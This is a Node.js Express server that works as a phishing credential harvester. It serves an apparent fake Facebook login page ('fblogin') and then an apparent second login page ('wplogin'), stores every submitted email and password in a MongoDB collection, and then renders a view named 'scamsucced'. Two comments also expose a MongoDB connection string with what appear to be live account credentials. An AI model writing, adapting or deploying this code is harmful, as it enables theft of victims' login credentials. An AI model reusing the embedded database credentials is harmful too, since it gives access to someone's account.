const express = require("express");
const app = express();
const path = require("path");
const hbs = require("hbs");
const port = process.env.PORT || process.env.MONGODB_URI || 3000;
const viewspath = path.join(__dirname, "../views");
const { append } = require("express/lib/response");
const login = require("./models/login");
const async = require("hbs/lib/async");
require("./DB/conn");

app.set("view engine", "hbs");
app.set("views", viewspath);
app.use(express.static(viewspath));
// mongodb+srv://samthool:vonahidegi@leaflix-east.c1yu8er.mongodb.net/?retryWrites=true&w=majority
// mongodb+srv://samthool:vonahidegi@leaflix-east.c1yu8er.mongodb.net/fb--login

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.get(`/`, (req, res) => {
  res.render(`index`);
});

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/fblogin", (req, res) => {
  res.render("fblogin");
});

app.post("/fblogin", async (req, res) => {
  try {
    const email = req.body.email;
    const pass = req.body.pass;
    console.log()
    if (email === "" || pass === "") {
      res.render("fblogin");
    } else {
      console.log(req.body);
      const log = new login({
        email: email, 
        pass: pass,
      });
      const loged = await log.save();
      res.status(201).render("wplogin");
    } 
  } catch (err) {
    res.status(400).send(err);
  }
});

app.post("/wplogin", async (req, res) => {
    try {
      const email = req.body.email;
      const pass = req.body.pass;
      console.log(req.body);
        const log = new login({
          email: email,
          pass: pass,
        });
        const loged = await log.save();
        res.status(201).render("scamsucced");
    } catch (err) {
      res.status(400).send(err);
    }
  });

app.get("/", (req, res) => {
  res.send("JS File");
});

app.listen(port, () => {
  console.log(`listening to the port at ${port}`);
});
